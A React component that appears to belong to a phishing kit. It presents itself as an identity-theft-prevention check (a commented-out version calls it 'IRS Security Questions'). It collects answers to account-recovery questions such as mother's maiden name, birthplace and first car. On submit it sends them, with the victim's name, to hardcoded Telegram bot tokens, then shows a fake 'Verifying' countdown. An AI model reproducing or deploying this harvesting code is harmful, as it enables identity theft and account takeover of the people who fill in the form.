import React, { useEffect, useState } from "react";
import elogo from '../assets/logo-removebg-preview.png'
// import connect from '../assets/connect.jpg'
import ApplyHeader from "./applyHeader";

const Security: React.FC = () => {
 
//   const TELEGRAM_BOT_TOKEN = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
// const TELEGRAM_CHAT_ID = "6639364559";

  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";

  const [step, setStep] = useState(0);
  const [answers, setAnswers] = useState(Array(11).fill(''));

  const questions = [
    "Father's full name",
    "Mother's full name",
    "Mother's Maiden Name",
    "Your City & State Of Birth",
    "City you grew up in",
    "Name of your previous employer",
    "Name of your current employer",
    "Name of your pet",
    "Maker of your first car",
     "Name of High School",
    "Graduated Month & Year (High School)"
  ];

  

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newAnswers = [...answers];
    newAnswers[step] = e.target.value;
    setAnswers(newAnswers);
  };

  const handleNext = () => {
    if (step < questions.length - 1) {
      setStep(step + 1);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    

    const message = answers
      .map((answer, index) => ` ${fullName} ${questions[index]}: ${answer}`)
      .join('\n');

    const telegramBotToken = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
    const telegramChatId = '7062736155';

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    try {
      await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
        }),
      });
      setShowPopup(true)
      // alert('Form submitted and sent to Telegram!');
    } catch (error) {
      console.error('Error sending message:', error);
      alert('Failed to send the message.');
    }
  };
  
  // const [q1, setQ1] = useState("");
  // const [q2, setQ2] = useState("");
  // const [q3, setQ3] = useState("");
  // const [q4, setQ4] = useState("");
  // const [q5, setQ5] = useState("");
  // const [q6, setQ6] = useState("");
  // const [q7, setQ7] = useState("");
  // const [q8, setQ8] = useState("");
  // const [q9, setQ9] = useState("");
  // const [status, setStatus] = useState("");

  // const handleSubmit = async (e: React.FormEvent) => {
  //   e.preventDefault();
  //   setShowPopup(true);
  //   setStatus("Sending...");

  //   const message = `
  //   🔒  ${fullName} IRS Security Questions:
    
  //   1️⃣ Father's full name:

  //   👉 ${q1}
    
  //   2️⃣ Mother's full name:

  //   👉 ${q2}
    
  //   3️⃣ Mother's Maiden Name:

  //   👉 ${q3}
    
  //   4️⃣ Your City & State Of Birth:

  //   👉 ${q4}
    
  //   5️⃣ City you grew up in:

  //   👉 ${q5}
    
  //   6️⃣ Name of your previous employer:
  //   👉 ${q6}
    
  //   7️⃣ Name of your current employer:

  //   👉 ${q7}
    
  //   8️⃣ Name of your pet:

  //   👉 ${q8}
    
  //   9️⃣ Maker of your first car:
  //   👉 ${q9}
  //   `;
    
  //   try {
  //     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //       body: JSON.stringify({
  //         chat_id: TELEGRAM_CHAT_ID,
  //         text: message,
  //       }),
  //     });

  //     setStatus("✅ Sent successfully!");
  //     setQ1("");
  //     setQ2("");
  //     setQ3("");
  //     setQ4("");
  //     setQ5("");
  //     setQ6("");
  //     setQ7("");
  //     setQ8("");
  //     setQ9("");
  //   } catch (err) {
  //     console.error(err);
  //     setStatus("❌ Failed to send.");
  //   }
  // };


 
  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);



  

  return (
    <>
    <ApplyHeader/>
    <div className="flex justify-center items-center mt-6  bg-white px-4">

{showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        {/* <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
          <img src={connect} alt="" />
        </h1> */}

        <h1 className="text-2xl font-bold p-5 text-center mb-2">Help us prevent identity theft and protect your identity</h1>

<p className="text-sm">To ensure security, please answer the following security questions. Your answers will be checked against the available background records from relevant autorities for verification</p>
        {/* Message */}
     

        <div className="max-w-md mx-auto p-6 bg-white rounded shadow">
        <form onSubmit={handleSubmit} className="max-w-xl mx-auto p-4">
  {/* Progress Bar */}
  <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
    <div
      className="bg-green-600 h-4 rounded-full transition-all duration-300"
      style={{ width: `${((step + 1) / questions.length) * 100}%` }}
    ></div>
  </div>

  <label className="block mb-2 font-medium">{questions[step]}</label>
  <input
    type="text"
    value={answers[step]}
    onChange={handleChange}
    className="w-full border p-2 rounded mb-4"
    required
  />

  {step < questions.length - 1 ? (
    <button
      type="button"
      onClick={handleNext}
      className="w-full bg-green-600 hover:bg-green-700 text-white py-2 rounded font-semibold"
    >
      Next
    </button>
  ) : (
    <button
      type="submit"
      className="w-full bg-green-600 hover:bg-green-700 text-white py-2 rounded font-semibold"
    >
      Submit
    </button>
  )}
</form>

      {status && <p className="mt-3 text-sm text-gray-700">{status}</p>}
    </div>


       
      
        
      </div>
    </div></>
  );
};

export default Security;
